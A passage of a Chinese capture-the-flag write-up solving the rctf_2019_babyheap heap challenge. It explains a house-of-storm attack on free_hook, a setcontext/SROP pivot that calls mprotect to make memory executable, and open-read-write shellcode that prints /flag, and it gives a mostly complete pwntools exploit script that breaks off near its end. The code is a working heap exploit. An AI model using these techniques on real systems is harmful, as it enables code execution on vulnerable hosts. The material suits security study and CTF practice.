class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment">#---------------布置chunk-------------------------#</span><br><span class="hljs-attribute">add</span>(<span class="hljs-number">0</span>x18)#<span class="hljs-number">4</span><br><span class="hljs-attribute">add</span>(<span class="hljs-number">0</span>x508)#<span class="hljs-number">5</span><br><span class="hljs-attribute">add</span>(<span class="hljs-number">0</span>x18)#<span class="hljs-number">6</span><br><span class="hljs-attribute">add</span>(<span class="hljs-number">0</span>x18)#<span class="hljs-number">7</span><br><span class="hljs-attribute">add</span>(<span class="hljs-number">0</span>x508)#<span class="hljs-number">8</span><br><span class="hljs-attribute">add</span>(<span class="hljs-number">0</span>x18)#<span class="hljs-number">9</span><br><span class="hljs-attribute">add</span>(<span class="hljs-number">0</span>x18)#<span class="hljs-number">10</span><br><br><span class="hljs-comment">#dbg()</span><br><span class="hljs-comment">#----------------准备 unsorted chunk-----------------------#	</span><br><span class="hljs-attribute">edit</span>(<span class="hljs-number">5</span>, 'a'*<span class="hljs-number">0</span>x4f0+p64(<span class="hljs-number">0</span>x500))<br><br><span class="hljs-comment">#dbg()</span><br><br><span class="hljs-attribute">free</span>(<span class="hljs-number">5</span>)<br><span class="hljs-attribute">edit</span>(<span class="hljs-number">4</span>, 'a'*<span class="hljs-number">0</span>x18)<br><br><span class="hljs-comment">#dbg()</span><br><br><span class="hljs-attribute">add</span>(<span class="hljs-number">0</span>x18)#<span class="hljs-number">5</span><br><span class="hljs-attribute">add</span>(<span class="hljs-number">0</span>x4d8)#<span class="hljs-number">11</span><br><span class="hljs-attribute">free</span>(<span class="hljs-number">5</span>)<br><span class="hljs-attribute">free</span>(<span class="hljs-number">6</span>)<br><br><span class="hljs-comment">#dbg()</span><br><br><span class="hljs-attribute">add</span>(<span class="hljs-number">0</span>x30)#<span class="hljs-number">5</span><br><span class="hljs-attribute">add</span>(<span class="hljs-number">0</span>x4e8)#<span class="hljs-number">6</span><br><br><span class="hljs-comment">#dbg()</span><br><br><span class="hljs-comment">#-------------------准备 large chunk-----------------------------------#</span><br><span class="hljs-attribute">edit</span>(<span class="hljs-number">8</span>, 'a'*<span class="hljs-number">0</span>x4f0+p64(<span class="hljs-number">0</span>x500))<br><span class="hljs-attribute">free</span>(<span class="hljs-number">8</span>)<br><span class="hljs-attribute">edit</span>(<span class="hljs-number">7</span>, 'a'*<span class="hljs-number">0</span>x18)<br><span class="hljs-attribute">add</span>(<span class="hljs-number">0</span>x18)#<span class="hljs-number">8</span><br><span class="hljs-attribute">add</span>(<span class="hljs-number">0</span>x4d8)#<span class="hljs-number">12</span><br><span class="hljs-attribute">free</span>(<span class="hljs-number">8</span>)<br><span class="hljs-attribute">free</span>(<span class="hljs-number">9</span>)<br><span class="hljs-attribute">add</span>(<span class="hljs-number">0</span>x40)#<span class="hljs-number">8</span><br><span class="hljs-comment">#---------------unsorted chunk 和 large chunk 放到对应位置----------------------#</span><br><br><span class="hljs-comment">#dbg()</span><br><br><span class="hljs-attribute">free</span>(<span class="hljs-number">6</span>)<br><br><span class="hljs-comment">#dbg()</span><br><br><span class="hljs-attribute">add</span>(<span class="hljs-number">0</span>x4e8)#<span class="hljs-number">6</span><br><br><span class="hljs-comment">#dbg()</span><br><br><span class="hljs-attribute">free</span>(<span class="hljs-number">6</span>)<br><br><span class="hljs-comment">#dbg()</span><br><br><span class="hljs-comment">#pause()</span><br><span class="hljs-comment">#--------------修改他们的满足条件进行 house of strom------------------------------#</span><br><span class="hljs-attribute">storage</span> = free_hook<br><span class="hljs-attribute">fake_chunk</span> = storage - <span class="hljs-number">0</span>x20<br><span class="hljs-attribute">payload</span> = '\x00'*<span class="hljs-number">0</span>x10 + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>x4f1) + p64(<span class="hljs-number">0</span>) + p64(fake_chunk)<br><span class="hljs-attribute">edit</span>(<span class="hljs-number">11</span>, payload)<br><br><span class="hljs-comment">#dbg()</span><br><br><span class="hljs-attribute">payload</span> = '\x00'*<span class="hljs-number">0</span>x20 + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>x4e1) + p64(<span class="hljs-number">0</span>) + p64(fake_chunk+<span class="hljs-number">8</span>) +p64(<span class="hljs-number">0</span>) + p64(fake_chunk-<span class="hljs-number">0</span>x18-<span class="hljs-number">5</span>)<br><span class="hljs-attribute">edit</span>(<span class="hljs-number">12</span>, payload)<br><br><span class="hljs-comment">#dbg()</span><br><br><span class="hljs-attribute">add</span>(<span class="hljs-number">0</span>x48)#<span class="hljs-number">6</span><br></code></pre></td></tr></tbody></table></figure>
<h3 id="mprotect-shellcode"><a href="#mprotect-shellcode" class="headerlink" title="mprotect-shellcode"></a>mprotect+shellcode</h3>
<p>修改free_hook为set_context+53，free_hook+0x18，free_hook+0x18，shellcode1,<br>
setcontext函数负责对各个寄存器进行赋值，甚至可以控制rip，对寄存器进行赋值主要从+53开始，shellcode1即为read(0, new_addr,0x1000)，new_addr即为（free_hook &amp;0xFFFFFFFFFFFFF000）free_hook所在内存页的起始位置。我们将对这里赋予可读可写可执行权限。</p>
<figure class="highlight x86asm"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">new_addr =  free_hook &amp;<span class="hljs-number">0xFFFFFFFFFFFFF000</span><br>shellcode1 = <span class="hljs-string">'''</span><br><span class="hljs-keyword">xor</span> <span class="hljs-built_in">rdi</span>,<span class="hljs-built_in">rdi</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>,%d<br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">edx</span>,<span class="hljs-number">0x1000</span><br><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">eax</span>,<span class="hljs-number">0</span><br><span class="hljs-keyword">syscall</span><br><br><span class="hljs-keyword">jmp</span> <span class="hljs-built_in">rsi</span><br><span class="hljs-string">'''</span> % new_addr<br>edit(<span class="hljs-number">6</span>, <span class="hljs-string">'a'</span>*<span class="hljs-number">0x10</span>+p64(set_context+<span class="hljs-number">53</span>)+p64(free_hook+<span class="hljs-number">0x18</span>)*<span class="hljs-number">2</span>+asm(shellcode1))<br></code></pre></td></tr></tbody></table></figure>
<p class='item-img' data-src='https://img-blog.csdnimg.cn/61bf594dbee4483f94beaf7afa376c9d.png?ynotemdtimestamp=1663776411460'><img src="https://img-blog.csdnimg.cn/61bf594dbee4483f94beaf7afa376c9d.png?ynotemdtimestamp=1663776411460" alt="在这里插入图片描述"></p>
<p>修改前<br class='item-img' data-src='https://img-blog.csdnimg.cn/59681f7ab0f64f57a185cacaffcb4ca2.png?ynotemdtimestamp=1663776411460'><img src="https://img-blog.csdnimg.cn/59681f7ab0f64f57a185cacaffcb4ca2.png?ynotemdtimestamp=1663776411460" alt="在这里插入图片描述"><br>
修改后<br class='item-img' data-src='https://img-blog.csdnimg.cn/6bbe06a1c4ab4168a5bcf210118afc78.png?ynotemdtimestamp=1663776411460'><img src="https://img-blog.csdnimg.cn/6bbe06a1c4ab4168a5bcf210118afc78.png?ynotemdtimestamp=1663776411460" alt="在这里插入图片描述"></p>
<h3 id="SROP"><a href="#SROP" class="headerlink" title="SROP"></a>SROP</h3>
<p>我们利用pwntools里的SigreturnFrame()执行mprotect(new_addr,0x1000,7)，并将rsp跳转到<br>
free_hook+0x10处，即0x00007f05935487c0，之后执行0x00007f05935487c0地址处的代码，即我们刚才写入的shellcode1，执行read(0, new_addr,0x1000)，将我们构造的第二个shellcode写入0x00007f0593548000处 ，并将rip跳转到我们写的第二个shellcode处执行。</p>
<figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs stylus">frame = <span class="hljs-built_in">SigreturnFrame</span>()<br>frame<span class="hljs-selector-class">.rsp</span> = free_hook+<span class="hljs-number">0</span>x10<br>frame<span class="hljs-selector-class">.rdi</span> = new_addr<br>frame<span class="hljs-selector-class">.rsi</span> = <span class="hljs-number">0</span>x1000<br>frame<span class="hljs-selector-class">.rdx</span> = <span class="hljs-number">7</span><br>frame<span class="hljs-selector-class">.rip</span> = libc<span class="hljs-selector-class">.sym</span><span class="hljs-selector-attr">[<span class="hljs-string">'mprotect'</span>]</span><br><span class="hljs-function"><span class="hljs-title">edit</span><span class="hljs-params">(<span class="hljs-number">12</span>, str(frame)</span></span>)<br><span class="hljs-function"><span class="hljs-title">free</span><span class="hljs-params">(<span class="hljs-number">12</span>)</span></span><br></code></pre></td></tr></tbody></table></figure>
<p class='item-img' data-src='https://img-blog.csdnimg.cn/0211f5b1b2cb415b910461947216e62e.png?ynotemdtimestamp=1663776411460'><img src="https://img-blog.csdnimg.cn/0211f5b1b2cb415b910461947216e62e.png?ynotemdtimestamp=1663776411460" alt="在这里插入图片描述"><br class='item-img' data-src='https://img-blog.csdnimg.cn/96861fc257104349a4a906803ad96103.png?ynotemdtimestamp=1663776411460'><img src="https://img-blog.csdnimg.cn/96861fc257104349a4a906803ad96103.png?ynotemdtimestamp=1663776411460" alt="在这里插入图片描述"></p>
<h3 id="ORW"><a href="#ORW" class="headerlink" title="ORW"></a>ORW</h3>
<p>利用orw构造shellcode，发送过去并执行，获得shell</p>
<figure class="highlight x86asm"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">shellcode2 = <span class="hljs-string">'''</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">0x67616c662f</span> <span class="hljs-comment">;// /flag</span><br><span class="hljs-keyword">push</span> <span class="hljs-built_in">rax</span><br><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-built_in">rsp</span> <span class="hljs-comment">;// /flag</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-number">0</span> <span class="hljs-comment">;// O_RDONLY</span><br><span class="hljs-keyword">xor</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-built_in">rdx</span> <span class="hljs-comment">;</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">2</span> <span class="hljs-comment">;// SYS_open</span><br><span class="hljs-keyword">syscall</span><br><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-built_in">rax</span> <span class="hljs-comment">;// fd </span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>,<span class="hljs-built_in">rsp</span>  <span class="hljs-comment">;</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">1024</span> <span class="hljs-comment">;// nbytes</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>,<span class="hljs-number">0</span> <span class="hljs-comment">;// SYS_read</span><br><span class="hljs-keyword">syscall</span><br><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">1</span> <span class="hljs-comment">;// fd </span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-built_in">rsp</span> <span class="hljs-comment">;// buf</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-built_in">rax</span> <span class="hljs-comment">;// count </span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">1</span> <span class="hljs-comment">;// SYS_write</span><br><span class="hljs-keyword">syscall</span><br><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">0</span> <span class="hljs-comment">;// error_code</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">60</span><br><span class="hljs-keyword">syscall</span><br><span class="hljs-string">'''</span><br>sl(asm(shellcode2))<br>itr()<br></code></pre></td></tr></tbody></table></figure>
<p class='item-img' data-src='https://img-blog.csdnimg.cn/7f499b7e484a41cf8d8efde596b692d9.png?ynotemdtimestamp=1663776411460'><img src="https://img-blog.csdnimg.cn/7f499b7e484a41cf8d8efde596b692d9.png?ynotemdtimestamp=1663776411460" alt="在这里插入图片描述"></p>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#sh = remote("node4.buuoj.cn", 29278)</span><br>sh = process(<span class="hljs-string">'./rctf_2019_babyheap'</span>)<br>context(log_level = <span class="hljs-string">'debug'</span>, arch = <span class="hljs-string">'amd64'</span>, os = <span class="hljs-string">'linux'</span>)<br>elf = ELF(<span class="hljs-string">"./rctf_2019_babyheap"</span>)<br>libc = ELF(<span class="hljs-string">'../../libc-2.23.so--64'</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>():<br>        gdb.attach(sh)<br>        pause()<br><br><span class="hljs-comment">#命令简写化</span><br>s       = <span class="hljs-keyword">lambda</span> data               :sh.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :sh.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :sh.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :sh.sendlineafter(delim, data)<br>r       = <span class="hljs-keyword">lambda</span> num=<span class="hljs-number">4096</span>           :sh.recv(num)<br>ru      = <span class="hljs-keyword">lambda</span> delims   :sh.recvuntil(delims)<br>itr     = <span class="hljs-keyword">lambda</span>                    :sh.interactive()<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>,<span class="hljs-string">'\0'</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">'\0'</span>))<br>leak    = <span class="hljs-keyword">lambda</span> name,addr          :log.success(<span class="hljs-string">'{} = {:#x}'</span>.<span class="hljs-built_in">format</span>(name, addr))<br>lg=<span class="hljs-keyword">lambda</span> address,data:log.success(<span class="hljs-string">'%s: '</span>%(address)+<span class="hljs-built_in">hex</span>(data))<br><br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size</span>):<br>	ru(<span class="hljs-string">"Choice: \n"</span>)<br>	sl(<span class="hljs-string">'1'</span>)<br>	ru(<span class="hljs-string">"Size: "</span>)<br>	sl(<span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>	ru(<span class="hljs-string">"Choice: \n"</span>)<br>	sl(<span class="hljs-string">'3'</span>)<br>	ru(<span class="hljs-string">"Index: "</span>)<br>	sl(<span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>	ru(<span class="hljs-string">"Choice: \n"</span>)<br>	sl(<span class="hljs-string">'4'</span>)<br>	ru(<span class="hljs-string">"Index: "</span>)<br>	sl(<span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index, content</span>):<br>	ru(<span class="hljs-string">"Choice: \n"</span>)<br>	sl(<span class="hljs-string">'2'</span>)<br>	ru(<span class="hljs-string">"Index: "</span>)<br>	sl(<span class="hljs-built_in">str</span>(index))<br>	ru(<span class="hljs-string">"Content: "</span>)<br>	s(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwn</span>():<br> <br>	add(<span class="hljs-number">0x80</span>)<span class="hljs-comment">#0</span><br>	add(<span class="hljs-number">0x68</span>)<span class="hljs-comment">#1</span><br>	add(<span class="hljs-number">0xf0</span>)<span class="hljs-comment">#2</span><br>	add(<span class="hljs-number">0x18</span>)<span class="hljs-comment">#3</span><br>	<br>	<span class="hljs-comment">#dbg()</span><br><br>	free(<span class="hljs-number">0</span>)<br>	payload = <span class="hljs-string">'a'</span>*<span class="hljs-number">0x60</span> + p64(<span class="hljs-number">0x100</span>)<br>	edit(<span class="hljs-number">1</span>, payload)<br>	<br>	<span class="hljs-comment">#dbg()</span><br>	<br>	free(<span class="hljs-number">2</span>)<br><br>	<span class="hljs-comment">#dbg()</span><br><br>	add(<span class="hljs-number">0x80</span>)<span class="hljs-comment">#0</span><br>	show(<span class="hljs-number">1</span>)<br>	malloc_hook = u64(ru(<span class="hljs-string">'\x7f'</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\x00'</span>)) - <span class="hljs-number">0x58</span> - <span class="hljs-number">0x10</span><br>	libc.address = malloc_hook - libc.sym[<span class="hljs-string">'__malloc_hook'</span>]<br>	system = libc.sym[<span class="hljs-string">'system'</span>]<br>	free_hook = libc.sym[<span class="hljs-string">'__free_hook'</span>]<br>	set_context = libc.symbols[<span class="hljs-string">'setcontext'</span>]<br>	lg(<span class="hljs-string">'libc_base'</span>,libc.address)<br>	<br>	<span class="hljs-comment">#dbg()</span><br>	<br>	add(<span class="hljs-number">0x160</span>)<span class="hljs-comment">#2</span><br><br>	<span class="hljs-comment">#dbg()</span><br>	<span class="hljs-comment">#---------------布置chunk-------------------------#</span><br>	add(<span class="hljs-number">0x18</span>)<span class="hljs-comment">#4</span><br>	add(<span class="hljs-number">0x508</span>)<span class="hljs-comment">#5</span><br>	add(<span class="hljs-number">0x18</span>)<span class="hljs-comment">#6</span><br>	add(<span class="hljs-number">0x18</span>)<span class="hljs-comment">#7</span><br>	add(<span class="hljs-number">0x508</span>)<span class="hljs-comment">#8</span><br>	add(<span class="hljs-number">0x18</span>)<span class="hljs-comment">#9</span><br>	add(<span class="hljs-number">0x18</span>)<span class="hljs-comment">#10</span><br><br>	<span class="hljs-comment">#dbg()</span><br>	<span class="hljs-comment">#----------------准备 unsorted chunk-----------------------#	</span><br>	edit(<span class="hljs-number">5</span>, <span class="hljs-string">'a'</span>*<span class="hljs-number">0x4f0</span>+p64(<span class="hljs-number">0x500</span>))<br><br>	<span class="hljs-comment">#dbg()</span><br><br>	free(<span class="hljs-number">5</span>)<br>	edit(<span class="hljs-number">4</span>, <span class="hljs-string">'a'</span>*<span class="hljs-number">0x18</span>)<br>	<br>	<span class="hljs-comment">#dbg()</span><br><br>	add(<span class="hljs-number">0x18</span>)<span class="hljs-comment">#5</span><br>	add(<span class="hljs-number">0x4d8</span>)<span class="hljs-comment">#11</span><br>	free(<span class="hljs-number">5</span>)<br>	free(<span class="hljs-number">6</span>)<br>	<br>	<span class="hljs-comment">#dbg()</span><br>	<br>	add(<span class="hljs-number">0x30</span>)<span class="hljs-comment">#5</span><br>	add(<span class="hljs-number">0x4e8</span>)<span class="hljs-comment">#6</span><br>	<br>	<span class="hljs-comment">#dbg()</span><br>	<br>	<span class="hljs-comment">#-------------------准备 large chunk-----------------------------------#</span><br>	edit(<span class="hljs-number">8</span>, <span class="hljs-string">'a'</span>*<span class="hljs-number">0x4f0</span>+p64(<span class="hljs-number">0x500</span>))<br>	free(<span class="hljs-number">8</span>)<br>	edit(<span class="hljs-number">7</span>, <span class="hljs-string">'a'</span>*<span class="hljs-number">0x18</span>)<br>	add(<span class="hljs-number">0x18</span>)<span class="hljs-comment">#8</span><br>	add(<span class="hljs-number">0x4d8</span>)<span class="hljs-comment">#12</span><br>	free(<span class="hljs-number">8</span>)<br>	free(<span class="hljs-number">9</span>)<br>	add(<span class="hljs-number">0x40</span>)<span class="hljs-comment">#8</span><br>	<span class="hljs-comment">#---------------unsorted chunk 和 large chunk 放到对应位置----------------------#</span><br>	<br>	<span class="hljs-comment">#dbg()</span><br>	<br>	free(<span class="hljs-number">6</span>)<br>	<br>	<span class="hljs-comment">#dbg()</span><br>	<br>	add(<span class="hljs-number">0x4e8</span>)<span class="hljs-comment">#6</span><br>	<br>	<span class="hljs-comment">#dbg()</span><br>	<br>	free(<span class="hljs-number">6</span>)<br><br>	<span class="hljs-comment">#dbg()</span><br><br>	<span class="hljs-comment">#pause()</span><br>	<span class="hljs-comment">#--------------修改他们的满足条件进行 house of strom------------------------------#</span><br>	storage = free_hook<br>	fake_chunk = storage - <span class="hljs-number">0x20</span><br>	payload = <span class="hljs-string">'\x00'</span>*<span class="hljs-number">0x10</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x4f1</span>) + p64(<span class="hljs-number">0</span>) + p64(fake_chunk)<br>	edit(<span class="hljs-number">11</span>, payload)<br><br>	<span class="hljs-comment">#dbg()</span><br><br>	payload = <span class="hljs-string">'\x00'</span>*<span class="hljs-number">0x20</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x4e1</span>) + p64(<span class="hljs-number">0</span>) + p64(fake_chunk+<span class="hljs-number">8</span>) +p64(<span class="hljs-number">0</span>) + p64(fake_chunk-<span class="hljs-number">0x18</span>-<span class="hljs-number">5</span>)<br>	edit(<span class="hljs-number">12</span>, payload)<br><br>	<span class="hljs-comment">#dbg()</span><br><br>	add(<span class="hljs-number">0x48</span>)<span class="hljs-comment">#6</span><br>	<br>	<span class="hljs-comment">#dbg()</span><br><br>	new_addr =  free_hook &amp;<span class="hljs-number">0xFFFFFFFFFFFFF000</span><br>	shellcode1 = <span class="hljs-string">'''</span><br><span class="hljs-string">	xor rdi,rdi</span><br><span class="hljs-string">	mov rsi,%d</span><br><span class="hljs-string">	mov edx,0x1000</span><br><span class="hljs-string"></span><br><span class="hljs-string">	mov eax,0</span><br><span class="hljs-string">	syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">	jmp rsi</span><br><span class="hljs-string">	'''</span> % new_addr<br>	edit(<span class="hljs-number">6</span>, <span class="hljs-string">'a'</span>*<span class="hljs-number">0x10</span>+p64(set_context+<span class="hljs-number">53</span>)+p64(free_hook+<span class="hljs-number">0x18</span>)*<span class="hljs-number">2</span>+asm(shellcode1))<br><br>	<span class="hljs-comment">#dbg()</span><br><br>	frame = SigreturnFrame()<br>	frame.rsp = free_hook+<span class="hljs-number">0x10</span><br>	frame.rdi = new_addr<br>	frame.rsi = <span class="hljs-number">0x1000</span><br>	frame.rdx = <span class="hljs-number">7</span><br>	frame.rip = libc.sym[<span class="hljs-string">'mprotect'</span>]<br>	edit(<span class="hljs-number">12</span>, <span class="hljs-built_in">str</span>(frame))<br>	free(<span class="hljs-number">12</span>)<br>	<span class="hljs-comment">#dbg() </span><br><br>	shellcode2 = <span class="hljs-string">'''</span><br><span class="hljs-string">	mov rax, 0x67616c662f ;// /flag</span><br><span class="hljs-string">	push rax</span><br><span class="hljs-string"></span><br><span class="hljs-string">	mov rdi, rsp ;// /flag</span><br><span class="hljs-string">	mov rsi, 0 ;// O_RDONLY</span><br><span class="hljs-string">	xor rdx, rdx ;</span><br><span class="hljs-string">	mov rax, 2 ;// SYS_open</span><br><span class="hljs-string">	syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">	mov rdi, rax ;// fd </span><br><span class="hljs-string">	mov rsi,rsp  ;</span><br><span class="hljs-string">	mov rdx, 1024 ;// nbytes</span><br><span class="hljs-string">	mov rax,0 ;// SYS_read</span><br><span class="hljs-string">	syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">	mov rdi, 1 ;// fd </span><br><span class="hljs-string">	mov rsi, rsp ;// buf</span><br><span class="hljs-string">	mov rdx, 